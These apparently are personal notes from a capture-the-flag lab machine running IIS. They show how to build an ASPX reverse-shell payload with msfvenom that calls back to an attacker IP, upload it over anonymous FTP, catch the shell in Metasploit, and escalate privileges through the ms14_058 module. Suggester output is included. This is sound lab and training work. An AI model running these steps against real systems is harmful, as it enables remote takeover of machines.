# devel

- ip: 10.10.10.5
- IIS 7.5 => Windows 7 or Server 2008 R2

## initial foothold

- see `aspnet_client` folder: IIS probably executing ASPX
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=9090 -f aspx > shell.aspx`
- upload via anonymous FTP

## msfconsole

- `use exploit/multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set LHOST X.X.X.X`
  - `set LPORT ABCD`
  - `run` (start handler, wait for incoming connection)
- `use post/multi/recon/local_exploit_suggester`

```
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
bad [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
works [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
bad [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

- `use exploit/windows/local/ms14_058_track_popup_menu`
  - `set LHOST, LPORT`
  - `set TARGET 0`
  - `set SESSION 1`
